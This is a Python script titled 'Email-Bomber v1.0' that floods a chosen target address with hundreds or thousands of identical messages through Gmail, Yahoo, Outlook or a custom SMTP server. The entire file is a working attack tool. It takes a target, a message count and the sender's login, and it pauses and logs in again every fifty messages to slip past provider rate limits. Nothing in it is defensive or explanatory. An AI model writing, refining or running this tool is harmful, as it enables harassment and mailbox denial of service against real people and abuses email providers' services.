import smtplib
import sys
import time




class bcolors:
    GREEN ='\033[92m'
    YELLOW ='\033[93m'
    RED ='\033[91m'




def banner():
    print(bcolors.RED +'+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.RED + '''                                        ▓▓▓▓  
            ░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓    ▓▓    ██
      ░░▒▒▓▓██  ▓▓▓▓▓▓░░░░░░▒▒▒▒▓▓▓▓▓▓▓▓    ██
    ░░▓▓            ▓▓░░▒▒▒▒▒▒████    ██    ██
  ░░██              ▓▓▓▓▓▓▓▓██          ████  
░░▓▓                ▓▓░░▒▒▒▒██                
▒▒▓▓            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██            
▒▒▓▓          ▓▓░░▓▓░░░░▓▓▒▒▒▒▓▓▒▒██          
▒▒▓▓        ▓▓░░▓▓░░▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▓▓        
▒▒▓▓      ▓▓░░▓▓░░▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▓▓▒▒▓▓      
▒▒▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██    
▒▒▓▓    ▓▓░░▓▓░░░░░░▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒██    .___     .__         .
▒▒▓▓    ▓▓░░▓▓░░▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒██    [__ ._ _ [__) _ ._ _ |_  _ ._.
▓▓▓▓    ▓▓░░▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    [___[ | )[__)(_)[ | )[_)(/,[
▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████      
▓▓██    ▓▓░░▓▓░░░░░░▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    Developer: emrahbatigun
▓▓██    ▓▓░░▓▓░░▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    
▓▓██    ▓▓░░▓▓░░▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    
████    ▓▓░░▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    
██      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████████    
██      ▓▓░░▓▓░░░░▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    
        ▓▓░░▓▓░░▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    
        ▓▓░░▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒██▒▒██    
        ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████████████    
          ▓▓▒▒▓▓▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒██▒▒██      
            ▓▓▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒██▒▒██        
              ▓▓▒▒▓▓▓▓██████████▒▒██          
                ██████████████████            
''')


class email_bomber:

    count = 0
    

    def __init__(self):
        try:
            print(bcolors.RED + '\n Initializing...')
            self.target = str(input(bcolors.GREEN + 'Enter Target E-mail : '))
            print(bcolors.RED +'\n**********BOMBING MODES**********\n' + bcolors.RED + 'Mode 1 : (1000)\t' + bcolors.RED + 'Mode 2: (500)\t' + bcolors.RED + 'Mode 3: (250)\t' + bcolors.RED + 'Mode 4: (custom)\t')
            self.mode = int(input(bcolors.GREEN + 'Choose Bombing Mode (1,2,3,4): '))

            if self.mode > int(4) or int(self.mode < int(1)):
                print('ERROR: Invalid Option. Exiting...')
                sys.exit(1)

        except Exception as e:
            print(f'ERROR : {e}')
    
    def bomb(self):

        try:
            print(bcolors.RED + '\n****** Setting up bomb *****')
            self.amount = None

            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else :
                self.amount = int(input(bcolors.GREEN + 'Enter a Custom Amount : '))
            
            print(bcolors.RED + f'\n***** You Have Selected Bomb Mode {self.mode}, and {self.amount} E-mails will be sent *****')
        
        except Exception as e:
            print(f'ERROR : {e}')


    def email(self):

        try:
            print(bcolors.RED + '\n****** Setting up bomb *****\n')
            print(bcolors.RED +'\n**********E-mail Services **********\n' + bcolors.RED + '1: Gmail\t' + bcolors.RED + '2: Yahoo\t' + bcolors.RED + '3: Outlook\t')
            self.server = str(input(bcolors.GREEN + 'Enter E-mail Server or Choose Premade E-mail Services (1,2,3) : '))
            premade = ['1','2','3']

            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter Port Number : '))
            if default_port == True:
                self.port = int (587)
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
            self.fromAddr = str(input(bcolors.GREEN + 'Enter From Address : '))
            self.fromPwsd = str(input(bcolors.GREEN + 'Enter From Password : '))
            self.subject = str(input(bcolors.GREEN + 'Enter Subject : '))
            self.message = str(input(bcolors.GREEN + 'Enter Message : '))


            self.msg = '''From : %s\nTo: %s\nSubject : %s\n%s\n''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwsd)

        except Exception as e:
            print(f'ERROR : {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMB : {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n*****Attacking*****')
        step_counter = 0
        for email in range(self.amount):
            step_counter += 1
            self.send()
            time.sleep(0.5)
            if step_counter % 50 == 0:
                time.sleep(60)
                self.s.login(self.fromAddr,self.fromPwsd)
        self.s.close()
        print(bcolors.RED + '*****Attack Finished****')
        
                

if __name__=='__main__':
    banner()
    bomb = email_bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()


